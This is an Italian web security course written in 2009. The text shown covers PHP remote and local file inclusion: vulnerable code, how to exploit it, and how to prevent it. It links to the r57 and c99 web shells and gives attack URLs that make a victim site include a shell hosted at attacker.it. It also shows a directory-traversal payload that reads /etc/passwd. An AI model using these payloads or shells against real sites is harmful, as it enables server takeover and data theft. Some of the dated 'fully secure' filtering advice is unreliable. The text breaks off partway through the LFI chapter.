# WebSecurity-ITA-2009
A training course I wrote on Web Security, Exploit Development and Source Code Auditing In January 2009.
The content is outdated and the course was written in Italian, I'm publishing it as "Safe Keeping" for Memorabilia/Nostalgia days.

 
# Web Security
Un corso sulla Web Security a cura di Giovanni Buzzin, "Osirys"

Contact: osirys\[at\]autistici\[dot\]org

Scritto nel Gennaio 2009
 

# Indice

- [Web Security](#web-security)
- [Indice](#indice)
- [Prefaccia](#prefaccia)
- [Vulnerabilità degli Include/Require](#vulnerabilità-degli-include-require)
  - [Remote File Inclusion](#remote-file-inclusion)
    - [Analisi di codice](#analisi-di-codice)
    - [Sfruttare la falla](#sfruttare-la-falla)
    - [Prevenzione](#prevenzione)
  - [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
    - [Analisi di codice](#analisi-di-codice)
    - [Sfruttare la falla](#sfruttare-la-falla)
    - [Prevenzione](#prevenzione)
- [Vulnerabilità di tipo SQL Injection](#vulnerabilità-di-tipo-sql-injection)
  - [Union-based SQL Injection](#union-based-sql-injection)
  - [Blind SQL Injection](#blind-sql-injection)
  - [Live SQL Injection Auditing](#live-sql-injection-auditing)
  - [Prevenzione](#prevenzione)
- [Vulnerabilità legate al Logging](#vulnerabilità-legate-al-logging)
  - [Authority Bypass via SQLi](#authority-bypass-via-sqli)
    - [Prevenzione](#prevenzione)
  - [Insecure Cookie Handling (ICH)](#insecure-cookie-handling-ich)
    - [Prevenzione](#prevenzione)
- [Arbitrary File Upload](#arbitrary-file-upload)
  - [Analisi di codice](#analisi-di-codice)
  - [Sfruttare la falla](#sfruttare-la-falla)
    - [Content-type bypass](#content-type-bypass)
    - [Nascondere codice PHP in una immagine valida](#nascondere-codice-php-in-una-immagine-valida)
  - [Prevenzione](#prevenzione)
- [Vulnerabilità di tipo Cross Site Scripting (XSS)](#vulnerabilità-di-tipo-cross-site-scripting-xss)
  - [Permanent Cross-Site Scripting](#permanent-cross-site-scripting)
  - [Reflected Cross-Site Scripting](#reflected-cross-site-scripting)
  - [Exploiting XSS con Token Stealing](#exploiting-xss-con-token-stealing)
  - [Prevenzione](#prevenzione)
- [Remote Command Execution (RCE)](#remote-command-execution-rce)
  - [Analisi di codice](#analisi-di-codice)
    - [Caso "Diretto" di RCE](#caso-diretto-di-rce)
    - [Casi "Indiretti" di RCE](#casi-indiretti-di-rce)
  - [Sfruttare la falla](#sfruttare-la-falla)
    - [Caso "Diretto" di RCE](#caso-diretto-di-rce)
    - [Casi "Indiretti" di RCE](#casi-indiretti-di-rce)
  - [Prevenzione](#prevenzione)
    - [Caso "Diretto" di RCE](#caso-diretto-di-rce)
    - [Casi "Indiretti" di RCE](#casi-indiretti-di-rce)
- [Vari Exploit e Spiegazioni](#vari-exploit-e-spiegazioni)
  - [LinPHA Photo Gallery RCE](#linpha-photo-gallery-rce)
  - [phosheezy RCE](#phosheezy-rce)
  - [PhotoStand RCE](#photostand-rce)
  - [Da SQL Injection A RCE](#da-sql-injection-a-rce)
- [Conclusione](#conclusione)
 


# Prefaccia

Il proposito di questa guida è quello di sensibilizzare gli amministratori di siti web, e i cosiddetti programmatori del web sull'importanza della sicurezza, informaticamente parlando. Il web si sviluppa esponenzialmente, sempre di più sono gli utenti a possedere una connessione ad internet,
e sempre più importante diventa scrivere codice sicuro, e tenere i propri dati protetti.

In questa guida verrà analizzata la sicurezza in ambito web, come trovare i cosiddetti bachi, o bug, come sfruttarli, e come prevernirli. Per imparare, e capire a fondo da questa guida, consiglio di possedere delle nozioni di base o medie sul php, e sull'sql.
Verranno riportati vari esempi di codice vulnerabile, tra questi bug trovati direttamente da me, accompagnati dalle mie spiegazioni, che spero saranno il più chiare possibili. Cercherò pure di insegnarvi a scrivere exploit, script o programmi anche abbastanza complessi che sfruttano una vulnerabilità per vari scopi, come ottenere dati sensibili quali username e password, ottenere accesso al server, e via dicendo.

Tutto iniziò quando un giorno incominciai a leggere sorgenti in php, sorgenti dei CMS. Voi vi chiederete di cosa io stia parlando. CMS è l'acronimo di Content
Management System, e altro non sono che dei pacchetti, insiemi di file scritti per la maggior parte in codice php, contenti a volte codice javascript, e sql.
Quest'ultimo è appunto necessario quando ci si trova ad operare con cms abbastanza complessi, utilizzanti dei database per immagazzinare dati e informazioni.
I CMS sono quindi dei pacchetti, fatti apposta per dare la possibilità anche a chi non abbia conoscenza sul php, e che quindi non sia in grado di scriversi da solo il codice sorgente del proprio sito, di possederne uno.

Per imparare a trovare vulnerabilità nei cms, o su qualsiasi altro script php utilizzato su un qualunque sito web, non è sufficente conoscere i vari tipi di bug,
ma bisogna capire come funziona il cms preso in questione, capirne il funzionamento.
Quando sarete arrivati a questo livello, sarete in grado non solo di trovare comuni e semplici bug, ma sarete in grado di trovare bug anche più nascosti, più difficili da individuare.
Solitamente uno script, o un cms, utilizza vari file per conseguire il suo scopo, molte volte presenta funzionalità di log in, permettendo quindi agli utenti registrati di
"loggarsi" sul sito.
Cito un bellissimo sito che raccoglie una vastissima scelta di cms, e script in php: HotScripts. In questo sito sarà infatti possibile scaricare numerossisimi script php, e cms,
usati quindi proprio dagli amministratori di siti web.
Il link esatto contente le varie categorie di cms e script scaricabili è subito riportato: http://www.hotscripts.com/PHP/

Un codice php risulta per la maggior parte delle volte vulnerabile quando un utente esterno, registrato al sito o non, può inserire codice in form, o da GET o POST, senza che il contenuto
venga poi controllato. Ci si chiede a questo punto se il creatore di questa pagina si fida degli utenti, o semplicemente non pensa che questa sua svista possa causare un intromissione nel sito.
Tutte e due vi risponderò io.

In questa prima parte vi insegnerò come trovare le vulnerabilità più semplici, e come sfruttarle.
Innazitutto, quando si apre una pagina php, bisogna sempre controllare se ci sono eventuali include di pagine esterne, per vedere quindi le funzioni utilizzate, se le variabili sono dichiarate
e quant'altro.


# Vulnerabilità degli Include Require
## Remote File Inclusion
### Analisi di codice
Un cms, essendo composto da molti file, ha la necessità di includere altri file all'interno di altri ancora. Se per esempio ci sono delle funzioni utilizzate più volte in un cms, è conveniente scriverle tutte in un pagina, e poi includere quest'ultima in una pagina che le deve utilizzare. Altrimenti dovremmo riscriverci le funzioni in ogni pagina che le utilizzi.

L'include,il require, l'include_once e il require_once sono dunque quelle funzioni che PHP mette a disposizione a tale scopo. Ognuna di queste ha la funzione principale di includere un file all'interno di un altro.
Andiamo ora ad analizzare queste funzioni, che sono quelle che se utilizzate in modo poco sicuro, possono portare a vulnerabilità come la Remote File Inclusion e la Local File Inclusion.

La funzione principale di queste funzioni è quella di includere delle pagine, ma hanno delle lievi differenze tra di loro.
L'include e il require per esempio differiscono per il fatto che mentre se in un include si verifica un errore, questo viene segnalato e stampato sulla pagina ma lo script non si interrompe, invece nel require, qualvolta si verifichi un errore, questo oltre a venir stampato provocherà la chiusura dello script.
La differenza poi tra `include` e `include_once`, `require` e `require_once` è che senza `_once` allo script è permesso di caricare più volte un file, mentre in `include_once` e r`equire_once` il file può essere incluso una sola volta. 
Fintanto che troveremo include o require locali, la pagina sarà per la maggior parte dei casi protetta. A questo punto vi chiederete perchè anche un include locale può essere vulnerabile, la spiegazione arriverà inseguito, in quanto si tratta di vulnerabilità un po' più nascoste.

Analizziamo ora del codice per la maggior parte delle volte sicuro.

*a.php*
```php
//codice vario
include("pagina.php");
//codice vario
```

L'include in questione, include la pagina `pagina.php `all'interno del file `a.php`. Si tratta un include di tipo locale. Esaminiamo ora un include un pò diverso:

*a.php*
```php
//codice
$a = "pagina.php";
include($a);
//codice vario
```

Questo include include la variabile `$a` all'interno di `a.php`, ma è un include sicuro in quanto la variabile `$a` è dichiarata, in quando ha valore `pagina.php`, quindi sarà proprio questa a essere inclusa.
Analizziamo ora codice php soggetto alla comune e pericolosa vulnerabilità Remote File Inclusion. Già dal nome si capirà che è dovuta a una inclusione di una pagina esterna.
Ma come?

D'ora in poi utilizzerò l'acronimo RFI per indicare tale bug.
Una RFI è possibile quando il percorso da includere contiene al suo interno delle variabili, che dovranno essere o non dichiarate, oppure provenienti direttamente da input diretto dell'utente senza nessun controllo.

Analizziamo ora qualche caso di codice vulnerabile.

#### Include di variabile proveniente da GET/POST/COOKIE non filtrata

*rfi.php*
```php
<?php
//vario codice
$var = $_GET['bug'];
include($var);
?>
```

Vi ricordate quando prima ribadivo la fondamentale importanza di filtrare variabili il quale valore viene assegnato direttamente dall'utente? In questo caso il coder non ha minimamente pensato alle brutali conseguenze che la sua "svista" può causare.
Il contenuto della variabile `$var` proviene direttamente da GET, da input dell'utente quindi, e viene incluso senza prima essere opportunamente filtrato.
In questo caso `$var` proveniva da GET, ma lo stesso sarebbe se provenisse da POST, basta che il contenuto non venga poi filtrato.

Analizziamo ora un altro caso di codice vulnerabile.

#### Include di variabile non dichiarata
Questo caso necessità il Register Globals settato a ON.

*rfi2.php*
```php
<?php
//codice
include($var."ciao.php");
?>
```

Questo è già un caso diverso. Analizzando la pagina vediamo viene inclusa la variabile `$var,` ma non è dichiarata all'interno del file. Leggendo l'intero file notiamo che non ci sono altri include di pagine interne dove $var possa essere dichiarata. Il codice riportato è potenzialmente vulnerabile, ma necessità che la funzione Register Globals presente nel file di configurazione del php sia abilitata.
Il register global è una funzione che serve quando una variabile viene usata prima di essere inizializzata.
Se in uno script viene utilizzata una var non precedentemente dichiarata, in caso di Register Globals disattivato non sarà possibile dare a questa variabile il contenuto direttamente da GET. Qualora invece Register Globals sia ON, sarà possibile affidare il valore ad una variabile non dichiarata direttamente da GET. Ecco quindi che il caso sopra riportato diventa vulnerabile.

Analizziamo un ulteriore esempio

*rfi3.php*
```php
<?php
require("conf.php");
include($var);
?>
```

Leggendo il file, si può bene notare che `$var` non è dichiarata all'interno di questo, e che viene inclusa. A prima vista si direbbe RFI, in quanto `$var` non è dichiarata. Ma quel `require("conf.php"); `indica appunto che prima dell'inclusione potenzialmente vulnerabile è presente un include di una pagina interna. Andiamo a vedere se in questa pagina $var è dichiarata o no, riporto quindi 3 possibili casi.

#### Variabile dichiarata all'interno di un file incluso

*conf.php*
```php
<?php
// codice
$ var = "ehi.php";
//codice
?>
```

In questa pagina `$var` è dichiarata, e ha come valore il nome di un file locale. Questo primo caso non è dunque vulnerabile, in quanto si in `rfi3.php` c'era un include di una variabile che in quel file non era stata dichiarata, ma essendoci prima l'include di `conf.php`, e essendo in questo `$var` dichiarata, l'include non è vulnerabile. Infatti, se in `rfi3.php` diamo un print di `$var`, verrà printato
`ehi.php`, in quanto il valore di `$var`, dichiarata in `conf.php`, viene memorizzato anche in rfi3.php grazie all'include.

#### Variabile non dichiarata

*conf.php*
```php
// codice vario php
// codice
```

In conf.php vediamo che `$var` non è dichiarata. La variabile quindi non è dichiarata né in rfi3.php, ne in `conf.php`. Ci troviamo di fronte a un include vulnerabile a RFI.

#### Variabile dichiarata in conf.php, ma non filtrata
Caso GET:

*conf.php*
```php
//codice
$var = $_GET['bug'];
//codice
```

Caso POST:

*conf.php*
```php
//codice
$var = $_POST['bug'];
//form POST html
```

In entrambi i casi, `$var` è si dichiarata, ma il valore è sempre affidato dall'utente esterno da GET o POST. Ci troviamo di fronte a una RFI.

Fino ad ora ho sempre parlato di GET POST, facciamo qualche esempio di Remote File Inclusion da Cookie.

*rfi_cookie.php*
```php
<?php
$var = $_COOKIE['template'];
include($var);
?>
```

Come si può notare, `$var` è il contenuto del cookie `template`. Successivamente si nota l'include di `$var`.
Ci troviamo di fronte a include vulnerabile, in quanto settando un link di un file esterno al contenuto del cookie 'template', questo link verrà incluso.

### Sfruttare la falla

Dopo i seguenti esempi, impariamo a sfruttare una vulnerabilità di questo tipo.
Poiché è possibile quindi assegnare valore arbitrario alle variabili non dichiarate, oppure dichiarate ma provenienti da GET/POST non filtrate, incluse in pagine .php, possiamo assegnare a tali variabili link di pagine esterne al sito. A che pro direte voi?
Si potrebbe includere pagine esterne innocue, come ad esempio l'homepage di un sito preso a caso.
La vulnerabilità di tipo Remote File Inclusion può essere considerata la più pericolosa, in quanto includendo un file esterno, il codice in esso contenuto verrà eseguito come se facesse parte del sito vulnerabile.
Includere quindi un file esterno scritto in codice php, è l'obiettivo di un qualunque cracker/hacker.
I file più comunemente inclusi nelle RFI, sono chiamati Shell. Script in php dalle svariate funzioni. Le Shells più comuni hanno al loro interno codice php che una volta eseguito permetterà di ottenere informazioni sul server del sito vulnerabili, eseguire comandi arbitrari sul server, vedere files del server, caricare files su questo, e molte altre cose ancora.
La RFI è la vulnerabilità più appetitosa per un cracker, in quanto gli consente di fare quasi ciò che vuole, o per meglio dire, qualsiasi cosa che la shell inclusa gli permetta di fare.

Riporto dunque i nomi e link alle shell più comumente usate.
La r57, una delel prime create, forse una delle migliore:

Link: http://evilc0der.com/r57.txt

La c99, più facile da usere e quindi per utenti meno esperti, più user friendly diciamo.

Link: http://evilc0der.com/c99.txt

Durante un inclusione, se si vuole che il codice della pagina inclusa venga eseguito sul sito vulnerabile, l'estensione del file contente codice php malevolo, dovrà essere in .txt. Se includiamo infatti una pagina con estensione .php, il codice verrà eseguito sul server locale, ovvero sul server che hosta il sito contenente la shell.
Dunque, per far si che il codice della shell inclusa venga eseguito sul server vulnerabile, la shell dovrà avere estensione .txt.

Riportiamo ora gli esempi di codice vulnerabile illustrati nel capitolo precedente, e vediamo come sfruttare una RFI.

#### GET - Include di variabile proveniente da GET non filtrata

*rfi.php*
```php
<?php
//vario codice
$var = $_GET['bug'];
include($var);
?>
```

Prendiamo come sito vulnerabile il sito: `http://sito.it/` contente la pagina `rfi.php` nella `/` di questo.
Il percorso dunque sarà:
`http://sito.it/rfi.php`

Nell'esempio sopracitato vediamo che `$var` assume il valore da GET.
Facciamo finta che il nostro script php con estensione `.txt` sia presente a questo link:
`http://attacker.it/shell.txt`

Assegnamo dunque a `$var` il valore di `http://attacker.it/shell.txt` in modo tale che questo sia incluso e eseguito su `http://sito.it/` .

L'attacco avverrà nel seguente modo:
`http://sito.it/rfi.php?bug=http://attacker.it/shell.txt`

Inserendo dunque questo link nel nostro browser, vedremo magicamente apparire `shell.txt`, eseguita con successo su `http://sito.it`


#### POST - Include di variabile proveniente da POST non filtrata

*rfi.php*
```php
<?php
$var = $_POST['bug'];
include($var);
?>
```
```html
<html>
   <head><title>Pagina vulnerabile a RFI</title></head>
   <body>
      <form action="" method="post">
        <table>
          <input type="text" name ="bug">
        </table>
      </form>
   </body>
</html>
```

Il contenuto di `$var` non è più assegnato da GET, ma da POST. Andiamo quindi a vedere in quale form dovremo inserire `http://attacker.it/shell.txt` affinchè `$var` assuma tale valore.
Il valore di `$var` è impostato da ciò che l'utente mette da POST nel form con nome: bug.
`$var` quindi è assegnata da ciò che metteremo nel form `<input type="text" name ="bug">` .
Basterà inserire in esso:
`http://attacker.it/shell.txt`

E `$var` assumerà quel valore e l'inclusione verrà effettuata.


#### $_REQUEST: Include di variabile proveniente da GET/POST non filtrata

Ovviamente se una variabile proviene dalla variabile speciale `$_REQUEST` potremmo affidarle il valore che vogliamo si da GET che da POST.


#### Include di variabile non dichiarata
Come già spiegato prima, qui necessitiamo dei Register Globals ON.

*rfi2.php*
```php
<?php
//codice
include($var);
?>
```

`$var `non è dichiarata, le affidiamo quindi il valore da get, in questo modo:
`http://sito.it/rfi.php?var=http://attacker.it/shell.txt`


**CASO PARTICOLARE**
Analizziamo questo codice:

*rfi2.php*
```php
<?php
//codice
include($var."ciao.php");
?>
```

Come possiamo vedere, nell'include oltre a `$var` è inclusa la pagina `ciao.php`, concatenata a `$var` con il punto `.` .
In questo caso non potremmo più utilizzare lo stesso attacco, in quando assegnano ad esempio a `$var` il valore:
http://attacker.it/shell.txt

Non verrà più incluso solo quel valore come nei casi prima, ma l'inclusione risultante sarà questa:
`include("http://attacker.it/shell.txtciao.php");`

Riceveremmo quindi un errore 404 come questo:
`The requested URL /r57.txtlol.php was not found on this server.`

Il problema dunque è dovuto alla concatenazione della nostra variabile `$var` con `ciao.php`, per portare a termine il nostro attacco dovremmo quindi fare in modo che il resto dopo il punto `.` nell'inclusione non venga considerato.
Si utilizza quindi il doppio punto interrogativo `??`. Così facendo ciao.php non verrà più presa in considerazione nell'include, in quanto sarà dopo il `??`. L'inclusione andrà a buon esito.

L'attacco utilizzato sarà quindi:
`http://sito.it/rfi.php?var=http://attacker.it/shell.txt??`

L'include risulterà dunque in questo modo:
`include(http://attacker.it/shell.txt??ciao.php");`
`ciao.php` dunque verrà escluso, e non ci sarà più fastidio.

Ora abbiamo imparato a trovare vulnerabilità di tipo Remote File Inclusion, e come sfruttarle.
Impariamo ora a prevenirle.

### Prevenzione

Abbiamo visto quanto grave sia questo tipo di vulnerabilità, è bene sapere che è molto facile prevenirla.
Innanzitutto, per poter effettuare include di pagine di siti esterni, la funzione `allow_url_include` del file php.ini deve essere abilitata.
Se nel file di configurazione di php disabilitiamo questa funzione, non sarà più possibile includere siti esterni, quindi il server sarà **totalmente** sicuro dalla RFI.
Bisogna sapere che comunque su molti server la funzione `allow_url_include` è abilitata, in quanto ci sono script e cms che necessitano di questa, per includere pagine di siti esterni, non shell ovviamente.

Abbiamo visto quando si incorre a un bug di tipo RFI, dovremmo già aver capito come si previene.
Essendo la RFI dovuta all'include di variabili non dichiarate o non filtrate proveniente da GET/POST, basterà dichiarare sempre una variabile prima di includerla, e nel caso questa provenga da GET o POST, di filtrarla opportunamente con delle regexp o funzioni apposite.

#### Prevenire RFI dovute alla mancanza di dichiarazione di variabili incluse

Il caso di:
*rfi2.php*
```php
<?php
//codice
include($var);
?>
```

Può diventare sicuro semplicemente dichiarando la variabile. Per esempio:

```php
<?php
//codice
$var = "ciao.php"
include($var);
?>
```

Abbiamo dunque dichiarato `$var`, dandole come valore il nome della pagina interna da includere.

La direttiva Register Globals in questo caso torna utile, in quanto nel caso in cui questa fosse disattivata, il codice soprastante non risulterebbe vulnerabile, proprio perché non sarebbe possibile assegnare il valore a `$var` direttamente da GET.

#### Prevenire RFI dovute ad assegnazione arbitraria di variabili GET/POST

Questo caso è leggermente più articolato, e richiede una minima conoscenza di php.
Il problema sorge quando è proprio un utente a dover assegnare il valore a una variabile da includere, bisogna quindi limitare la sua scelta.
Qui entrano in gioco la fantasia dell'autore dello script.
Se l'utente per esempio deve scegliere da POST la variabile, e si vuole che questa abbia solo alcuni valori, basta mettere i valori consentiti in un array, facendo in modo che se l'utente metta un valore estraneo a quell'array, quindi non consentito, appaia per esempio un messaggio di errore.
In questo caso basta solo sbizzarsi, e scegliere quali valori l'utente può mettere, e quali no.
Esempio:

```php
<?php
//code
$pagina = $_GET['pagina'];
$pagine_consentite = array("pagina1.php","pagina2.php","conf.php");
if (in_array($pagina,$pagine_consentite)) {
    include($pagina);
}
else {
    echo "<b> Tentativo di attacco bloccato</b><br>";
}
//code
?>
```

Leggendo questo esempio, si nota come l'include sia sicuro. La pagina che deve essere inclusa proviene da GET, quindi in mancanza di un filtro, l'include potrebbe essere soggetto a RFI. In questo caso però ho messo un array contente le pagine che possono venire incluse, e con la condizione if sucessiva faccio in modo che se la pagina da includere scelta dall'utente non è consentita, ovvero non fa parte delle pagine contenute nell'array, allora verrà printato a schermo "*Tentativo di attacco bloccato*" e l'include non verrà eseguito.

Penso che questo tipo di filtro sia uno tra i migliori, ma ce ne possono essere altri altrettanto validi, basta un po' di fantasia, ad ogni modo ora riporterò un altro esempio di include sicuro.

```php
<?php
//code
$pagina = $_GET['pagina'];
//la pagina da venire inclusa deve essere un file presente
if (is_file($pagina)) {
    include($pagina);
}
else { 
    echo "<b> Tentativo di attacco bloccato</b><br>";
}
//code
?>
```

Questo pezzo di codice è si al sicuro da attacchi di tipo RFI, in quanto un file remoto non può superare la condizione `is_file()`, in quanto questa considera file locali, non esterni ..
Ma risulta vulnerabile a LFI, ecco perché è necessaria una sostituzione per rendere l'include al 100% sicuro.

```php
$pagina = str_replace("/", "", $pagina);
$pagina = str_replace(".", "", $pagina);
$pagina = str_replace("%", "", $pagina);
```

Effettuando queste sostituzioni, anche tentando di includere un file locale, non ci si riuscirà, poichè se da GET metteremo `?pagina=../` quindi il `.` per cambiare cartella, la `/` per selezionare un altra cartella, oppure un `%` Null Byte per annullare il resto dell'inclusione, l'inclusione non avverrà come avremmo voluto, dato che `/ . %` verranno sostituiti con una stringa nulla.

Ecco la versione totalmente sicura:
```php
<?php
//code
$pagina = $_GET['pagina'];
$pagina = str_replace("/", "", $pagina);
$pagina = str_replace(".", "", $pagina);
$pagina = str_replace("%", "", $pagina);
//la pagina da venire inclusa deve essere un file presente in locale
if (is_file($pagina)) {
    include($pagina);
}
else { 
    echo "<b> Tentativo di attacco bloccato</b><br>";
}
//code
?>
```

In questo esempio notiamo sempre che `$pagina` proviene da GET. `$pagina` dovrebbe venire inclusa, ma per evitare che in `$pagina` venga messo un link di una pagina esterna al sito come una shell, ho messo una condizione molte semplice ma che basterà a evitare una possibile RFI.
La condizione if stabilisce che se il valore messo da GET dall'utente non è una pagina presente in quella directory del sito, allora viene stampato a schermo "*Tentativo di attacco bloccato*" e `$pagina` non verrà inclusa. Quindi chiunque cerchi di mettere un link esterno in `$pagina` o comunque una pagina non esistente nel server verrà bloccato, e l'include non verrà effettutato.

Come si può vedere, è molto facile evitare una Remote File Inclusion. Ora faccio un breve riassunto per raccogliervi le idee:

1) Dichiarare **SEMPRE** le variabili prima che queste vengano incluse.
2) Se queste provengono da GET o POST REQUEST o COOKIE, applicare dei filtri per verificarne il contenuto prima che vengano incluse.
3) Filtri come: verificare che la pagina sia un file esistente sul server oppure che faccia parte di un array di pagine consentite da includere.

Tutti questi accorgimenti sono fondamentali per evitare RFI, però entra in gioco ora il `php.ini`, il file di configurazione del php presente in ogni server.
Nel `php.ini `ci sono delle fuzioni interessanti che possono prevenire e bloccare qualsiasi tipo di inclusione remota, quindi una RFI, analizziamole.
`Allow_url_include` è una funzione del php, presente nel file php.ini, che se disabilitata, bloccherà qualsiasi tipo di inclusione remota, quindi anche se uno script fosse vulnerabile a remote file inclusion, questa falla non potrebbe essere sfruttata proprio per la configurazione del server.
`Allow_url_fopen` ha la stessa funzionalità, in quanto se abilitata permette di includere ed aprire script e pagine presenti su server remoti, ma se disabilitata bloccherà qualsiasi tipo di inclusione di file esterni al server locale.
Vi direte voi allora perché queste funzioni non vengano disabilitate sui server per evitare falle di tipo RFI.
Ci sono dei pro e dei contro riguardo l'abilitazione/disabilitazione di queste funzioni.
Come pro ovviamente avremo che una falla di tipo Remote File Inclusion non potrà mai essere sfruttata se le funzioni `allow_url_include` e `allow_url_fopen` sono disabilitate.
Ma bisogna considerare anche i contro, in quanto ci sono script, o cms, che necessitano di includere file o script esterni, e quindi disabilitando queste funzioni verra negata la possibilità a programmatori web di includere ad esempio librerie o file presenti su siti esterni.
Per questo motivo, molti server non disabilitano queste funzioni nel file di configurazione di php.
Vi faccio anche qualche esempio: la nota compagnia di hosting Aruba, permette inclusioni di file esterni, mentre Altervista, famosissimo sito di hosting gratuito italiano, non la permette.
Nel caso in cui queste funzioni siano abilitate, è bene fare dei dovuti accorgimenti a livello server.

Innanzitutto è consgiliata una adeguata assegnazione dei permessi. Se le funzioni `allow_url_include` e `allow_url_fopen` sono abilitate infatti non è solo a rischio il sito vulnerabile, ma l'intero server. Dunque è vivamente consigliato togliere i permessi di lettura alle directory al di fuori del sito. Altrimenti, un attacker una volta inclusa una shell nel sito potrà deliberatamente girare in tutte le directory del vostro server. A me capitò più volte ad esempio di trovare server Linux configurati in modo pessimo, dove una voltra entrati con una shell, si aveva libero accesso non solo di lettura, ma perfino di scrittura su tutte le directory del server, così l'attacker oltre a leggere qualisasi file all'interno del server, aveva il permesso di scrivere su qualunque file, e poichè un server nella maggior parte dei casi hosta numerosi siti, erano possibile scrivere e modificare qualsiasi pagina di qualsiasi sito hostato, e quindi un attacker poteva effettuare un mass deface, ovvero defacciare, quindi cambiare le homepage di tutti i siti.
Nel caso quindi che queste funzioni del php siano abilitate, è bene controllare i permessi nelle varie directory. Altro opportuno accorgimento da fare lato server sarebbe quello di negare i permessi di esecuzioni di file nelle directory, ad esempio nella dir `/tmp` dei server Linux.
Un attacker infatti, se scoprisse di avere su `/tmp` permessi di esecuzione, starebbe poco a compromettere il vostro server, magari eseguendo un exploit locale per ottenere privilegi di amministratore.

Cari miei ascoltatori e lettori, la Remote File Inclusion è una delle vulnerabilità più pericolose, in quanto è quella che permette ad un attacker di fare tutto ciò che è in suo potere, quindi prestate attenzione nello scrivere codice sicuro, sopratutto se si è a conoscenza che le funzioni di inclusioni remote del php.ini siano abilitate.

Spero di essere stato chiaro nell'esaminazione di questa prima ma pericolosa vulnerabilità, e spero sopratutto che abbiate capito come prevenirla.

## Local File Inclusion (LFI)

Nel capitolo precedente, sono state descritte le funzioni del php `include`, `require`, `include_once` e `require_once`, e si ha imparato a trovare vulnerabilità legate a queste, come la Remote File Inclusion.
Oltre a questo tipo di vulnerabilità, queste funzioni sono anche soggette al bug conosciuto come Local File Inclusion (LFI).
RFI e LFI sono molto simili come vulnerabilità, sia nell'identificazione, che nello sfruttamento e nella prevenzione in quanto sono sempre dovute a una mancata dichiarazione di una variabile, oppure alla diretta inclusione di questa senza dovuti filtri in caso di provenienza da GET/POST.

### Analisi di codice

Come ho già detto, RFI e LFI sono molto simili come vulnerabilità, andiamo ora a vedere qualche codice vulnerabile e non.

```php
<?php
//code
$dir  = "/dir";
$dir2 = "dir2";
include ("$dir/$dir2/file.php");
//code
?>
```

Questo include non è vulnerabile, in quanto `$dir` e `$dir2` sono dichiarate e il loro contenuto è una directory pre-impostata.

Analizziamo un altro codice sicuro:

```php
<?php
//code
include ("/lol/lol.php");
//code
?>
```

L'include è di tipo locale, non vi sono variabili all'interno, è sicuro.

Iniziamo ora ad analizzare i vari casi in cui un codice è afflito da vulnerabilità di tipo Local File Inclusion.

#### Inclusione di una variabile non dichiarata

```php
<?php
//code
include ("path/$dir/dir2/file.php");
//code
?>
```


Come si nota, nell'include è presente la variabile `$dir`, la quale non è stata anticipamente dichiarata.
Sarà possibile dunque assegnarle un valore arbitrario per includere un file locale.

#### Inclusione di una variabile proveniente da GET/POST

```php
<?php
//code
$dir = $_GET['dir'];
include ("path/$dir/dir2/file.php");
//code
?>
```

Anche in questo caso, poiché `$dir` proviene da GET, le si può assegnare un valore arbitrario e quindi sfruttare la LFI.

L'importanza della LFI, è che quando viene incluso un file, che deve essere locale ed esistente, questo viene anche eseguito.

Vediamo ancora codice vulnerabile, che a prima vista non lo sembrerebbe. Molti programmatori utilizzano la funzione del php `is_file()` per verificare se il file esiste, e quindi se questo veramente esiste, viene incluso. Bene, se non ci sono variabili non dichiarate, o proveninti a GET/POST e non controllate all'interno della funzione `is_file`, l'include sarà sicuro. Ma andiamo a vedere un esempio concreto per capirci meglio.

```php
<?php
$a = "dir";
if (is_file("/dir/$a/file.php")) {
    include("/dir/$a/file.php";
}

?>
```

Se il file `file.php` all'interno delle cartelle `/dir/dir` esiste, questo verrà incluso, ma si tratta comunque di un include locale, non vulnerabile. Vediamo un altro esempio:

```php
<?php
$a = $_GET[dir];
if (is_file("/dir/$a/file.php")) {
    include("/dir/$a/file.php");
}
?>
```

Il codice di seguito riportato è vulnerabile in quanto `$a` proviene da GET, e non vi è presente nessun opportuno filtro. Potremmo assegnare quindi da GET un valore alla variabile `$a` con un file esistente, quindi la codizione `is_file()` risulterà vera, e l'inclusione andrà a buon fine.

Analizziamo ancora un altro codice vulnerabile.

```php
<?php
//code
$dir = $_GET['lol'];
include ("path/dir2/$dir.php");
//code
?>
```

L'esempio qui riportato è leggermente diverso, in quanto la variabile non si trova tra le directory, ma rappresenta proprio il file da includere. E' sempre lo stesso, basta assegnare a `$dir` il valore del file locale, con la presenza del `%00`, sennò il file locale verrà incluso con l'estensione `.php` finale.

### Sfruttare la falla

La caratteristica della LFI è quella di poterci includere un file locale, che quindi verrà eseguito.
Se ad esempio, sul sito siamo riusciti a caricare un file.txt con all'interno presente codice php, quando includeremo questo file locale, verrà eseguito. Ad ogni modo questa tecnica è stata ben esaminata nela capitolo sucessivo, quello della RCE.
Andiamo ora a vedere come sfruttare davvero una falla LFI.

Come dovreste aver capito, RFI e LFI sono molto simili, in quanto sono vulnerabilità legate sempre all'inclusione in modo insicuro di variabili. Abbiamo imparato che basta che queste variabili incluse non siano dichiarate, o proveniente da input dell'utente, che l'include sarà vulnerabile.

#### Include con variabile non dichiarata o proveniente da input
*a.php*
```php
<?php
//code
include ("path/$dir/dir2/file.php");
//code
?>
```

L'attacco risulta estremamente facile. Basta assegnare un valore a `$dir`:
`http://localhost/a.php?dir=`

Con questa sintassi stiamo assegnando un valore a `$dir`.
A questo punto, dovremmo conoscere la path di un file presente nel server vittima. Se si tratta di un server linux, come nella maggior parte dei casi, si può includere per fare una prova il file `/etc/passwd`, il file con informazioni circa gli utenti di un dato sistema.
Però, come si può vedere, nell'inclusione, dopo `$dir`, sono presenti altre path: `/dir2/file.php`.
Innanzitutto bisogna sapere, che bisognerà effettuare un directory trasversal. Dal momento che il file a.php si troverà ad esempio in `/home/utente/html/a.php`, se noi ponessimo `$dir` come `/etc/passwd`, l'inclusione risulterà la seguente:
`include("path/etc/passwd/dir2/file.php");`

Non era quello che volevamo. Innanzitutto siccome il file `passwd` si trova in `/etc/`, dovremmo quindi scendere di directory. In linux come in windows, si usa `../` per scendere i directory. Quindi mettendo:
`http://localhost/a.php?dir=../../../../../../../../../../etc/passwd`

la path risultante risulterà:
`include("path/../../../../../../../../../../etc/passwd/dir2/file.php");`

